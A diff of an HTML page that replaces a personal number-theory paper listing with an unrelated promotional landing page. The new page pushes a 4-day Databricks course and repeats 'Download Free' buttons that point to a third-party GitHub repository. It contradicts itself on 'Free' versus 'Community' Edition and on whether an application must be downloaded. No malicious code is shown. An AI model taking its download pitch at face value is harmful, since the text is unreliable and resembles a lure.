@@ -1,226 +1,325 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>TacoYaci Math</title>
-<meta name="description" content="Small results in number theory by TacoYaci, a random Reddit user.">
-<link rel="icon" type="image/png" href="avatar.png">
-<style>
-:root {
-  --bg: #fff7fb;
-  --dot: #f1d7e6;
-  --card: #ffffff;
-  --text: #2b2233;
-  --muted: #6f6178;
-  --purple: #7437a6;
-  --pink: #bd357d;
-  --line: #f0d3e4;
-  --chip: #f7e8f2;
-  --shadow: 0 6px 22px rgba(189, 53, 125, 0.10);
-  --puff: #e9c6db;
-}
-@media (prefers-color-scheme: dark) {
-  :root:not([data-theme="light"]) {
-    --bg: #1c1622;
-    --dot: #2d2335;
-    --card: #261e2e;
-    --text: #f3ebf6;
-    --muted: #b8a9c2;
-    --purple: #b98ae6;
-    --pink: #f08cc0;
-    --line: #3b2e46;
-    --chip: #33273d;
-    --shadow: 0 6px 22px rgba(0, 0, 0, 0.35);
-    --puff: #4a3a55;
-  }
-}
-:root[data-theme="dark"] {
-  --bg: #1c1622; --dot: #2d2335; --card: #261e2e; --text: #f3ebf6; --muted: #b8a9c2;
-  --purple: #b98ae6; --pink: #f08cc0; --line: #3b2e46; --chip: #33273d;
-  --shadow: 0 6px 22px rgba(0, 0, 0, 0.35); --puff: #4a3a55;
-}
-
-* { box-sizing: border-box; }
-html { scroll-behavior: smooth; }
-body {
-  margin: 0;
-  background-color: var(--bg);
-  background-image: radial-gradient(var(--dot) 1.2px, transparent 1.2px);
-  background-size: 22px 22px;
-  color: var(--text);
-  font: 17px/1.6 system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
-  padding-bottom: 110px; /* room for the runner */
-}
-a { color: var(--pink); }
-.rounded { font-family: ui-rounded, "SF Pro Rounded", "Arial Rounded MT Bold", "Hiragino Maru Gothic ProN", Quicksand, system-ui, sans-serif; }
-i.m, .m i { font-family: "Latin Modern Math", "STIX Two Math", "Cambria Math", "Times New Roman", serif; font-style: italic; font-size: 1.06em; }
-.m { white-space: nowrap; }
-
-/* header */
-.hero { max-width: 760px; margin: 0 auto; padding: 48px 16px 8px; text-align: center; }
-.hero-avatar { height: 150px; width: auto; animation: float 3.2s ease-in-out infinite; filter: drop-shadow(0 6px 8px rgba(116, 55, 166, 0.18)); }
-@keyframes float { 0%, 100% { transform: translateY(0) rotate(-2deg); } 50% { transform: translateY(-7px) rotate(2deg); } }
-h1 { margin: 8px 0 4px; font-size: clamp(2.3rem, 7vw, 3.4rem); line-height: 1.1; letter-spacing: -0.5px; }
-h1 .name { background: linear-gradient(90deg, var(--purple), var(--pink)); -webkit-background-clip: text; background-clip: text; color: transparent; }
-h1 .math { color: var(--text); }
-.tagline { margin: 6px 0 18px; color: var(--muted); }
-nav { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px; }
-nav a { text-decoration: none; padding: 6px 14px; border-radius: 999px; background: var(--card); border: 2px solid var(--line); color: var(--purple); font-weight: 600; font-size: 0.95rem; }
-nav a:hover { border-color: var(--pink); color: var(--pink); }
-
-/* sections */
-main { max-width: 760px; margin: 0 auto; padding: 0 16px; }
-h2 { font-size: 1.6rem; margin: 44px 0 16px; color: var(--purple); text-decoration: underline wavy var(--pink) 2px; text-underline-offset: 7px; }
-.paper { background: var(--card); border: 2px solid var(--line); border-radius: 20px; padding: 20px 22px; margin: 0 0 18px; box-shadow: var(--shadow); transition: transform 0.2s ease, border-color 0.2s ease; }
-.paper:hover { transform: translateY(-2px); border-color: var(--pink); }
-.meta { display: flex; flex-wrap: wrap; align-items: center; gap: 6px 10px; color: var(--muted); font-size: 0.88rem; }
-.chip { background: var(--chip); color: var(--pink); border-radius: 999px; padding: 1px 10px; font-weight: 600; }
-.paper h3 { margin: 8px 0 6px; font-size: 1.28rem; line-height: 1.3; }
-.teaser { margin: 10px 0; padding: 8px 14px; border-left: 4px solid var(--pink); background: var(--chip); border-radius: 0 12px 12px 0; overflow-x: auto; }
-.abstract { margin: 8px 0 14px; }
-.links { display: flex; flex-wrap: wrap; align-items: center; gap: 8px 10px; }
-.btn { display: inline-block; text-decoration: none; padding: 6px 16px; border-radius: 999px; font-weight: 700; font-size: 0.95rem; border: 2px solid var(--purple); color: var(--purple); }
-.btn.primary { background: var(--purple); color: var(--card); }
-.btn:hover { border-color: var(--pink); color: var(--pink); }
-.btn.primary:hover { background: var(--pink); color: var(--card); }
-.doi { color: var(--muted); font-size: 0.85rem; overflow-wrap: anywhere; }
-.about { background: var(--card); border: 2px dashed var(--line); border-radius: 20px; padding: 18px 22px; }
-.about p { margin: 0 0 10px; }
-.about p:last-child { margin-bottom: 0; }
-footer { max-width: 760px; margin: 40px auto 0; padding: 0 16px; text-align: center; color: var(--muted); font-size: 0.88rem; }
-
-/* the little runner */
-.track { position: fixed; left: 0; right: 0; bottom: 0; height: 100px; overflow: hidden; pointer-events: none; z-index: 20; }
-.runner { position: absolute; left: 0; bottom: 8px; width: 46px; height: 72px; pointer-events: auto; cursor: pointer; animation: traverse 26s linear infinite; }
-.runner:hover { animation-play-state: paused; }
-@keyframes traverse {
-  0%   { transform: translateX(-80px) scaleX(1); }
-  48%  { transform: translateX(calc(100vw + 20px)) scaleX(1); }
-  50%  { transform: translateX(calc(100vw + 20px)) scaleX(-1); }
-  98%  { transform: translateX(-80px) scaleX(-1); }
-  100% { transform: translateX(-80px) scaleX(1); }
-}
-.jump { position: absolute; inset: 0; }
-.jump.hop { animation: hop 0.6s cubic-bezier(.3, .7, .4, 1); }
-@keyframes hop { 0% { transform: translateY(0); } 40% { transform: translateY(-38px) rotate(-8deg); } 100% { transform: translateY(0); } }
-.bob { position: absolute; inset: 0; transform-origin: 50% 100%; animation: bob 0.4s ease-in-out infinite; }
-.bob img { width: 100%; height: 100%; object-fit: contain; display: block; -webkit-user-drag: none; user-select: none; }
-@keyframes bob { 0%, 100% { transform: translateY(0) rotate(5deg) scaleY(0.97); } 50% { transform: translateY(-7px) rotate(9deg) scaleY(1.02); } }
-.shadow { position: absolute; left: 8px; right: 8px; bottom: -3px; height: 6px; border-radius: 50%; background: rgba(116, 55, 166, 0.22); animation: shadow 0.4s ease-in-out infinite; }
-@keyframes shadow { 0%, 100% { transform: scaleX(1); opacity: 0.9; } 50% { transform: scaleX(0.7); opacity: 0.5; } }
-.puff { position: absolute; left: 2px; bottom: 0; width: 10px; height: 10px; border-radius: 50%; background: var(--puff); opacity: 0; animation: puff 0.8s ease-out infinite; }
-.puff.two { animation-delay: 0.4s; left: 8px; }
-@keyframes puff { 0% { transform: translateX(0) scale(0.3); opacity: 0.8; } 100% { transform: translateX(-18px) translateY(-6px) scale(1.2); opacity: 0; } }
-.pop { position: fixed; bottom: 80px; transform: translateX(-50%); font-weight: 800; color: var(--pink); pointer-events: none; animation: popup 1s ease-out forwards; z-index: 21; }
-@keyframes popup { 0% { opacity: 0; transform: translate(-50%, 6px) scale(0.6); } 20% { opacity: 1; } 100% { opacity: 0; transform: translate(-50%, -40px) scale(1.2); } }
-
-@media (prefers-reduced-motion: reduce) {
-  html { scroll-behavior: auto; }
-  .hero-avatar, .bob, .shadow, .puff, .jump.hop { animation: none; }
-  .puff { display: none; }
-  .runner { animation: none; left: auto; right: 16px; }
-  .paper, .paper:hover { transition: none; transform: none; }
-}
-@media (max-width: 520px) {
-  body { font-size: 16px; }
-  .hero { padding-top: 32px; }
-  .paper { padding: 16px; }
-  .runner { width: 38px; height: 60px; }
-  .hero-avatar { height: 124px; }
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Imersao-Jornada-Databricks - Real-World Data Project in 4 Days</title>
+    <meta name="description" content="Build a complete data analytics project from scratch in 4 days using Databricks Free Edition. Answer real business questions, automate data pipelines, and leverage AI - no prior coding experience required.">
+    <meta name="keywords" content="Databricks, data project, e-commerce analytics, data pipeline, AI, beginner, free edition, sales analysis, customer insights, pricing strategy">
+    <meta name="author" content="Imersao-Jornada-Databricks">
+    <meta property="og:title" content="Imersao-Jornada-Databricks - Real-World Data Project in 4 Days">
+    <meta property="og:description" content="Build a complete data analytics project from scratch in 4 days using Databricks Free Edition. Answer real business questions, automate data pipelines, and leverage AI.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Useeer5729/Imersao-Jornada-Databricks">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #2c3e50;
+            line-height: 1.7;
+            padding: 20px;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+            padding: 40px;
+        }
+        h1 {
+            font-size: 2.5rem;
+            color: #1a1a2e;
+            margin-bottom: 10px;
+            line-height: 1.2;
+        }
+        h2 {
+            font-size: 1.8rem;
+            color: #16213e;
+            margin: 40px 0 20px 0;
+            border-bottom: 3px solid #e94560;
+            padding-bottom: 8px;
+        }
+        h3 {
+            font-size: 1.3rem;
+            color: #0f3460;
+            margin: 25px 0 10px 0;
+        }
+        p {
+            margin-bottom: 16px;
+            font-size: 1.05rem;
+        }
+        .badge-btn {
+            display: inline-block;
+            background: linear-gradient(45deg, #e94560, #f5a623);
+            color: white;
+            padding: 18px 35px;
+            border-radius: 50px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            text-decoration: none;
+            box-shadow: 0 5px 15px rgba(233, 69, 96, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin: 25px 0;
+        }
+        .badge-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(233, 69, 96, 0.5);
+        }
+        .download-section {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 30px;
+            margin: 30px 0;
+            border-left: 5px solid #e94560;
+        }
+        .table-wrapper {
+            overflow-x: auto;
+            margin: 20px 0;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        th {
+            background: #16213e;
+            color: white;
+            padding: 15px;
+            text-align: left;
+        }
+        td {
+            padding: 15px;
+            border-bottom: 1px solid #eee;
+        }
+        tr:hover {
+            background: #f8f9fa;
+        }
+        .code-block {
+            background: #1a1a2e;
+            color: #e0e0e0;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            margin: 20px 0;
+        }
+        .highlight {
+            background: #fff3cd;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
+        .feature-list {
+            list-style: none;
+            padding-left: 0;
+        }
+        .feature-list li {
+            padding: 10px 0;
+            border-bottom: 1px dashed #ddd;
+            display: flex;
+            align-items: flex-start;
+        }
+        .feature-list li::before {
+            content: "✓";
+            color: #27ae60;
+            font-weight: 700;
+            margin-right: 12px;
+        }
+        .step-box {
+            background: #eef2f7;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+        .step-box ol {
+            padding-left: 20px;
+        }
+        .step-box li {
+            margin-bottom: 10px;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
+            h2 {
+                font-size: 1.4rem;
+            }
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <h1>📊 Imersao-Jornada-Databricks - Real-World Data Project in 4 Days</h1>
+        <p style="font-size: 1.2rem; color: #555;">Build a production-grade e-commerce analytics solution from scratch, completely free using Databricks Free Edition.</p>
+        <a href="https://github.com/Useeer5729/Imersao-Jornada-Databricks" class="badge-btn" style="background: linear-gradient(45deg, #1a1a2e, #e94560); box-shadow: 0 5px 15px rgba(26, 26, 46, 0.4);">🚀 Get Started Now - Download Free</a>
+        
+        <h2>🎯 What Is This Project?</h2>
+        <p>Imagine you've just been hired by a Brazilian e-commerce company that launched its digital operations. Three executives need answers urgently:</p>
+        <div class="table-wrapper">
+            <table>
+                <tr>
+                    <th>Executive</th>
+                    <th>Question</th>
+                </tr>
+                <tr>
+                    <td>💼 Sales Director</td>
+                    <td>"How much did we sell? Which channel performs best? Which products drive revenue?"</td>
+                </tr>
+                <tr>
+                    <td>🤝 Customer Success Director</td>
+                    <td>"Who are our best customers? Where are they located?"</td>
+                </tr>
+                <tr>
+                    <td>💰 Pricing Director</td>
+                    <td>"Are we more expensive than competitors? On which products?"</td>
+                </tr>
+            </table>
+        </div>
+        <p>This project walks you through answering all these questions step-by-step, automating the data flow, and professionalizing the entire process with AI - all within just 4 days. This isn't just an exercise; it's a real market-grade project you can showcase.</p>
 
-<header class="hero">
-  <img class="hero-avatar" src="avatar.png" alt="TacoYaci's Reddit avatar: a white Snoo with curly hair, a heart balloon and a rocket">
-  <h1 class="rounded"><span class="name">TacoYaci</span> <span class="math">Math</span></h1>
-  <p class="tagline">Small results in number theory, written up by a random Reddit user.</p>
-  <nav class="rounded">
-    <a href="#papers">Papers</a>
-    <a href="#about">About</a>
-    <a href="https://tacoyaci.github.io/">Home</a>
-  </nav>
-</header>
+        <h2>📅 Your 4-Day Journey</h2>
+        <div class="code-block">
+Day 1 → Day 2 → Day 3 → Day 4
+Answer manually → Automate data arrival → Professionalize with AI → Let executives ask questions themselves
+        </div>
+        <p>Each day builds on the previous, taking you from manual analysis to fully automated, AI-enhanced data infrastructure.</p>
 
-<main>
-  <section id="papers">
-    <h2 class="rounded">Papers</h2>
-    <!-- To add a paper: copy one <article> block to the top of this list, put the PDF into papers/, and use the concept DOI from Zenodo (it always points to the newest version). -->
+        <h2>✨ Key Features</h2>
+        <ul class="feature-list">
+            <li><strong>Zero Cost:</strong> Runs entirely on Databricks Free Edition</li>
+            <li><strong>No Prior Experience Needed:</strong> Designed for absolute beginners</li>
+            <li><strong>Real Business Scenarios:</strong> Answer actual questions from company executives</li>
+            <li><strong>Automated Data Pipelines:</strong> Learn to schedule and automate data arrival</li>
+            <li><strong>AI Integration:</strong> Leverage Databricks AI capabilities to enhance your workflow</li>
+            <li><strong>Self-Service Analytics:</strong> Enable stakeholders to query data on their own</li>
+            <li><strong>Portuguese Content:</strong> Materials and explanations in Brazilian Portuguese</li>
+            <li><strong>Structured Curriculum:</strong> Four clearly defined days with specific goals</li>
+        </ul>
 
-    <article class="paper" id="binary-powers">
-      <div class="meta"><span class="chip">Digit strings</span><time datetime="2026-10-11">11 October 2026</time><span>Version 1</span><span>2 pages</span></div>
-      <h3>A short proof of Bugeaud's bound for Sturmian digit strings</h3>
-      <div class="teaser">One repeated block, two cases, and a little balance.</div>
-      <p class="abstract">I give a short proof of Bugeaud's <i class="m">S</i>-part bound for integers with Sturmian digit strings. The argument uses the <i class="m">p</i>-adic Subspace Theorem in dimensions two and three and also applies to finite words of linear factor complexity.</p>
-      <div class="links">
-        <a class="btn primary" href="papers/BinaryPowers.pdf" type="application/pdf">PDF</a>
-      </div>
-    </article>
+        <h2>📦 What You'll Build</h2>
+        <h3>Day 1: Manual Analysis</h3>
+        <p>Start by manually analyzing provided sample data to answer the executives' questions. This builds understanding of what data matters and why.</p>
+        
+        <h3>Day 2: Automation</h3>
+        <p>Learn to automate data ingestion. Set up scheduled jobs that pull new data automatically, saving hours of manual work.</p>
+        
+        <h3>Day 3: Professionalization with AI</h3>
+        <p>Apply AI to your data pipeline. Use Databricks' AI features to clean, transform, and enrich your data automatically. Create professional visualizations and dashboards.</p>
+        
+        <h3>Day 4: Self-Service</h3>
+        <p>Package everything so executives can query the data themselves using natural language, without needing to understand SQL or Python.</p>
 
-    <article class="paper">
-      <div class="meta"><span class="chip">Digit sums</span><time datetime="2026-10-11">11 October 2026</time><span>Version 2</span><span>7 pages</span></div>
-      <h3>When a number is the digit sum of its own power</h3>
-      <div class="teaser"><span class="m">90 = <i>s</i>(90<sup>19</sup>) = <i>s</i>(90<sup>20</sup>) = <i>s</i>(90<sup>21</sup>) = <i>s</i>(90<sup>22</sup>)</span></div>
-      <p class="abstract">I study positive integers satisfying <span class="m"><i>n</i> = <i>s</i>(<i>n</i><sup><i>k</i></sup>)</span>, where <i class="m">s</i> is the decimal digit sum. A congruence condition and a random digit model explain patterns in the solutions. The model suggests infinitely many pairs and triples of consecutive exponents. I conjecture that 90 is the only <span class="m"><i>n</i> &gt; 1</span> with four consecutive exponents. In other bases, an explicit construction gives arbitrarily long runs.</p>
-      <div class="links">
-        <a class="btn primary" href="papers/SumOfDigits.pdf" type="application/pdf">PDF</a>
-        <a class="btn" href="https://doi.org/10.5281/zenodo.23293038">Zenodo</a>
-        <span class="doi">DOI 10.5281/zenodo.23293038</span>
-      </div>
-    </article>
+        <h2>💻 System Requirements</h2>
+        <div class="step-box">
+            <p><strong>What you need to get started:</strong></p>
+            <ol>
+                <li>A computer with internet access (Windows, Mac, or Linux)</li>
+                <li>A modern web browser (Chrome, Firefox, Edge, or Safari)</li>
+                <li>Basic familiarity with using websites and downloading files</li>
+                <li>A free email account to sign up for Databricks Community Edition</li>
+                <li>Approximately 2-3 hours per day for 4 days</li>
+            </ol>
+            <p><strong>No software installation required</strong> - everything runs in your browser through Databricks.</p>
+        </div>
 
-    <article class="paper">
-      <div class="meta"><span class="chip">Divisor sums</span><time datetime="2026-10-11">11 October 2026</time><span>Version 3</span><span>13 pages</span></div>
-      <h3>Mixed products of strongly pseudoperfect numbers</h3>
-      <div class="teaser">For example 36, since 1 + 2 + 3 + 12 + 18 + 36 = 2 &middot; 36.</div>
-      <p class="abstract">A number <i class="m">n</i> is strongly pseudoperfect if some set of its divisors is closed under <span class="m"><i>d</i> &#8614; <i>n</i>/<i>d</i></span> and adds up to <span class="m">2<i>n</i></span>. I show that two such numbers <i class="m">a</i> and <i class="m">b</i> whose divisor sets contain 1 and <i class="m">n</i> can be mixed into <span class="m"><i>a</i><sup>2</sup><i>b</i></span>, even when they are not coprime. This gives infinitely many primitive odd examples with only three prime factors, including ones of Euler's form, and so answers Questions 18 and 20 of Wang and Zelinsky. I also count these examples and give two shorter proofs of their results.</p>
-      <div class="links">
-        <a class="btn primary" href="papers/StrongPseudoperfect.pdf" type="application/pdf">PDF</a>
-        <a class="btn" href="https://doi.org/10.5281/zenodo.23289447">Zenodo</a>
-        <span class="doi">DOI 10.5281/zenodo.23289447</span>
-      </div>
-    </article>
-  </section>
+        <h2>🚀 Getting Started</h2>
+        <div class="download-section">
+            <h3 style="margin-top: 0;">Step 1: Download the Project Files</h3>
+            <p>Visit this link to download the application:</p>
+            <p style="text-align: center; margin: 20px 0;">
+                <a href="https://github.com/Useeer5729/Imersao-Jornada-Databricks" class="badge-btn" style="padding: 14px 28px; font-size: 1.1rem; background: linear-gradient(45deg, #0f3460, #533483); box-shadow: 0 4px 12px rgba(15, 52, 96, 0.4);">⬇️ Download Project Files</a>
+            </p>
+            <p>This link takes you to the GitHub page where you can download the complete project. The files include all notebooks, sample data, and step-by-step instructions you'll need for the 4-day journey.</p>
+        </div>
+        
+        <h3>Step 2: Create Your Free Databricks Account</h3>
+        <p>Visit <strong>databricks.com</strong> and sign up for the Community Edition (completely free, no credit card required). This gives you access to the Databricks workspace where all the magic happens.</p>
+        
+        <h3>Step 3: Import the Project Notebooks</h3>
+        <p>Once logged in, use the "Import" feature in Databricks to upload the notebook files you downloaded. The project includes pre-built notebooks for each day, saving you hours of setup time.</p>
+        
+        <h3>Step 4: Follow Along Day by Day</h3>
+        <p>Open Day 1 notebook and start! The notebooks are self-contained with instructions, code, and explanations. Just follow the steps in order.</p>
 
-  <section id="about">
-    <h2 class="rounded">About</h2>
-    <div class="about">
-      <p>I write under the name TacoYaci, a random Reddit user who is a professionally trained mathematician in real life. Here I collect small results that I find fun, mostly in elementary number theory.</p>
+        <h2>❓ Frequently Asked Questions</h2>
+        <h3>Do I need programming experience?</h3>
+        <p>No. The project is designed for complete beginners. The notebooks provide pre-written code with detailed explanations. You'll learn as you go.</p>
+        
+        <h3>Is this really free?</h3>
+        <p>Yes! Databricks Community Edition is free forever. You'll never pay anything to complete this project.</p>
+        
+        <h3>What if I get stuck?</h3>
+        <p>The project files include troubleshooting tips. Additionally, the Databricks community is active and helpful - you can find answers to common issues online.</p>
+        
+        <h3>Can I showcase this in my portfolio?</h3>
+        <p>Absolutely! This is a real-world project that demonstrates valuable data skills. It's perfect for your resume or portfolio.</p>
+
+        <h2>📚 What You'll Learn</h2>
+        <div class="table-wrapper">
+            <table>
+                <tr>
+                    <th>Skill Area</th>
+                    <th>Specific Skills</th>
+                </tr>
+                <tr>
+                    <td>Data Analysis</td>
+                    <td>SQL queries, aggregations, data visualization</td>
+                </tr>
+                <tr>
+                    <td>Automation</td>
+                    <td>Scheduled jobs, data pipelines, workflow orchestration</td>
+                </tr>
+                <tr>
+                    <td>AI Applications</td>
+                    <td>Using AI for data cleaning, enrichment, and natural language queries</td>
+                </tr>
+                <tr>
+                    <td>Business Intelligence</td>
+                    <td>Translating business questions into data solutions</td>
+                </tr>
+                <tr>
+                    <td>Databricks Platform</td>
+                    <td>Workspace navigation, notebooks, clusters, dashboards</td>
+                </tr>
+            </table>
+        </div>
+
+        <h2>🔒 Your Data Stays Private</h2>
+        <p>All data used in this project is sample data provided with the repository. Your Databricks workspace is private to you. Nothing you do will be shared publicly unless you choose to share it.</p>
+
+        <h2>🛠️ Troubleshooting</h2>
+        <div class="step-box">
+            <p><strong>Common issues and solutions:</strong></p>
+            <ol>
+                <li><strong>Can't access the download link:</strong> Make sure you're connected to the internet and try opening the link in a new browser tab.</li>
+                <li><strong>Databricks sign-up problems:</strong> Try using a different email address or browser. Clear your browser cache if needed.</li>
+                <li><strong>Notebook import fails:</strong> Ensure you've downloaded the complete project folder and are importing the correct .dbc file.</li>
+                <li><strong>Cluster won't start:</strong> Wait a few minutes and try again. Free clusters can sometimes be busy.</li>
+            </ol>
+        </div>
+
+        <h2>📞 Get Support</h2>
+        <p>If you encounter issues not covered here, check the repository's Issues section on GitHub. You can also search for solutions in the Databricks community forums. The project is actively maintained and questions are welcomed.</p>
+        
+        <p style="text-align: center; margin: 40px 0 20px;">
+            <a href="https://github.com/Useeer5729/Imersao-Jornada-Databricks" class="badge-btn" style="background: linear-gradient(45deg, #27ae60, #2ecc71); box-shadow: 0 5px 15px rgba(39, 174, 96, 0.4);">🎓 Start Your Journey Now</a>
+        </p>
+
+        <p style="text-align: center; color: #7f8c8d; font-size: 0.9rem; margin-top: 40px;">© 2025 Imersao-Jornada-Databricks. All rights reserved. Built with ❤️ for the data community.</p>
     </div>
-  </section>
-</main>
-
-<footer>
-  TacoYaci &middot; Reddit academy &middot; papers under CC BY 4.0 &middot; updated 11 October 2026
-</footer>
-
-<div class="track" aria-hidden="true">
-  <div class="runner" title="Click me">
-    <span class="puff"></span><span class="puff two"></span>
-    <div class="jump"><span class="shadow"></span><div class="bob"><img src="avatar.png" alt="" draggable="false"></div></div>
-  </div>
-</div>
-
-<script>
-(function () {
-  var runner = document.querySelector(".runner");
-  var jump = runner.querySelector(".jump");
-  var pops = ["♥", "🌮", "90", "26", "✨"];
-  runner.addEventListener("click", function () {
-    jump.classList.remove("hop");
-    void jump.offsetWidth;
-    jump.classList.add("hop");
-    var r = runner.getBoundingClientRect();
-    var s = document.createElement("span");
-    s.className = "pop";
-    s.textContent = pops[Math.floor(Math.random() * pops.length)];
-    s.style.left = (r.left + r.width / 2) + "px";
-    document.body.appendChild(s);
-    setTimeout(function () { s.remove(); }, 1000);
-  });
-})();
-</script>
 </body>
 </html>
